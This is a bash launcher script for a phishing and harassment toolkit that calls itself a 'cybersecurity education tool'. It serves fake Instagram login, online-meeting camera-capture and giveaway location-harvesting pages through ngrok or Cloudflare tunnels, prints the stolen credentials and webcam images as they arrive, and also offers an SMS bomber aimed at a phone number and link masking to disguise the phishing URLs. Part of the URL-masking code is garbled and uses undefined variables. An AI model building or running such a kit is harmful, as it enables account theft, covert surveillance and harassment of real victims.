#!/bin/bash

############################################
# COLORS
############################################

R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
C='\033[1;36m'
W='\033[1;37m'
NC='\033[0m'

############################################
# DEPENDENCY CHECK
############################################

check_command() {

if ! command -v $1 &> /dev/null
then

echo -e "${Y}[*] Installing $1 ...${NC}"

sudo apt update > /dev/null 2>&1
sudo apt install $2 -y > /dev/null 2>&1

echo -e "${G}[+] $1 installed${NC}"

else

echo -e "${G}[+] $1 found${NC}"

fi

}

############################################
# BASIC TOOLS
############################################

clear

echo -e "${C}Checking dependencies...${NC}"

check_command php php
check_command curl curl
check_command wget wget
check_command unzip unzip

############################################
# NGROK CHECK
############################################

if [ ! -f "./ngrok" ]; then

echo -e "${Y}[*] Downloading ngrok...${NC}"

wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1

unzip ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1

rm ngrok-v3-stable-linux-amd64.zip

chmod +x ngrok

echo -e "${G}[+] ngrok ready${NC}"

fi

############################################
# CLOUDFLARED CHECK
############################################

if ! command -v cloudflared &> /dev/null
then

echo -e "${Y}[*] Installing cloudflared...${NC}"

wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb > /dev/null 2>&1

sudo dpkg -i cloudflared-linux-amd64.deb > /dev/null 2>&1

rm cloudflared-linux-amd64.deb

echo -e "${G}[+] cloudflared ready${NC}"

fi

############################################
# CLEAN SCREEN
############################################

clear

############################################
# BRANDING
############################################

echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${C}TECHYFATCAT ${NC}─ ${W}Cybersecurity Education Tool v2.0${NC}"
echo -e "  ${Y}Developer:${NC} ${G}Aadit Sarhadi${NC} | ${P}CSE 2nd Year${NC}"
echo -e "  ${W}GitHub:${NC} ${B}techyfatcat${NC}"
echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

echo -e "  ${R}[!] Press CTRL+C anytime to stop the tool${NC}"

echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

############################################
# MENU
############################################

echo
echo -e "${G}Select Template:${NC}"

echo -e "  ${B}[1]${NC} Instagram (Dark UI)"

echo -e "  ${B}[2]${NC} Online Meeting (Camera Capture)"

echo -e "  ${B}[3]${NC} Mega Giveaway (Location & Data)"

echo -e "  ${B}[4]${NC} SMS Stress Tester (API Flooding)" # New Option

echo -e "  ${B}[5]${NC} URL Masker (Link Cloaking)"

read -p "  Selection > " option

if [[ $option == "4" ]]; then
    echo -e "\n${Y}[*] Entering Advanced SMS Bomber Mode...${NC}"
    read -p "  Enter Target Number: " target_num
    read -p "  Enter Number of SMS (e.g., 50): " sms_count
    
    # Audit Logging (Good for CSE projects)
    echo "[$(date)] Sent $sms_count SMS to $target_num" >> logs/bomber_history.txt
    
    cd modules/sms/
    # Running with Python3 - Ensure requirements are installed
    python3 bomber.py "$target_num" -N "$sms_count" -T 20 -C 91
    
    cd ../../
    echo -e "\n${G}[+] Bombing Task Complete.${NC}"
    sleep 2
    exec ./techyfatcat.sh
fi

    # The magic: creating the masked link
    # Format: https://mask-domain-keywords@short-url
    masked_url="https://$mask_dom-$keywords@${short_url#https://}"

    echo -e "\n${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e " ${G}[+] SUCCESSFUL MASKING]${NC}"
    echo -e " ${W}Masked URL: ${C}$masked_url${NC}"
    echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    echo -e "\n${Y}Note: Use this link for educational Social Engineering tests only.${NC}"
    read -p "  Press Enter to return to menu..."
    exec ./techyfatcat.sh
fi


echo
echo -e "${G}Select Tunnel Method:${NC}"

echo -e "  ${B}[1]${NC} Localhost"

echo -e "  ${B}[2]${NC} Cloudflare"

echo -e "  ${B}[3]${NC} Ngrok"

read -p "  Selection > " tunnel

############################################
# PATH CONFIG
############################################

ROOT_DIR="$(pwd)"

if [[ $option == "1" ]]; then

TARGET_DIR="$ROOT_DIR/modules/insta"

LOG_FILE="$ROOT_DIR/logs/output.txt"

echo -e "\n${Y}[*] Loading Instagram template...${NC}"

elif [[ $option == "2" ]]; then

TARGET_DIR="$ROOT_DIR/modules/meeting"

CAM_DIR="$ROOT_DIR/logs/cam"

echo -e "\n${Y}[*] Loading Meeting template...${NC}"

elif [[ $option == "3" ]]; then
    TARGET_DIR="$ROOT_DIR/modules/giveaway"
    LOG_FILE="$ROOT_DIR/logs/output.txt"
    echo -e "\n${Y}[*] Loading Giveaway template...${NC}"

else

echo -e "${R}[!] Invalid option${NC}"

exit 1

fi



############################################
# CLEAN OLD PROCESSES
############################################

pkill php > /dev/null 2>&1
pkill ngrok > /dev/null 2>&1
pkill cloudflared > /dev/null 2>&1

############################################
# START PHP SERVER
############################################

echo -e "${Y}[*] Starting PHP server...${NC}"

php -S 127.0.0.1:8080 -t "$TARGET_DIR" > /dev/null 2>&1 &

sleep 2

############################################
# START TUNNEL
############################################

if [[ $tunnel == "1" ]]; then

FINAL_URL="http://127.0.0.1:8080"

echo -e "${G}[+] Running on localhost${NC}"

elif [[ $tunnel == "2" ]]; then

echo -e "${Y}[*] Starting Cloudflare tunnel...${NC}"

cloudflared tunnel --url http://127.0.0.1:8080 > cloudflare.log 2>&1 &

sleep 8

FINAL_URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cloudflare.log)

echo -e "${G}[+] Cloudflare tunnel ready${NC}"

elif [[ $tunnel == "3" ]]; then

echo -e "${Y}[*] Starting Ngrok tunnel...${NC}"

./ngrok http 8080 > /dev/null 2>&1 &

sleep 6

FINAL_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')

echo -e "${G}[+] Ngrok tunnel ready${NC}"

else

echo -e "${R}[!] Invalid tunnel option${NC}"

exit 1

fi

############################################
# SHOW LINK
############################################

echo
echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

echo -e " ${G}TARGET URL${NC}"

echo -e " ${W}$FINAL_URL${NC}"

echo -e "${B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

echo
echo -e "${C}[*] Waiting for incoming data...${NC}"

############################################
# LISTENER LOOP
############################################

while true
do

############################################
# INSTAGRAM LOGGER
############################################

if [[ $option == "1" ]]; then

if [[ -s "$LOG_FILE" ]]; then

echo
echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

echo -e " ${G}[CREDENTIALS RECEIVED]${NC}"

echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

cat "$LOG_FILE"

echo -e "${G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

> "$LOG_FILE"

fi

############################################
# CAMERA LOGGER
############################################

elif [[ $option == "2" ]]; then

for img in "$CAM_DIR"/*.png; do

[ -e "$img" ] || continue

filename=$(basename "$img")

echo -e " ${C}[IMAGE RECEIVED]${NC} $filename saved in logs/cam"

mv "$img" "$CAM_DIR/received_$filename"

done

fi

sleep 2

done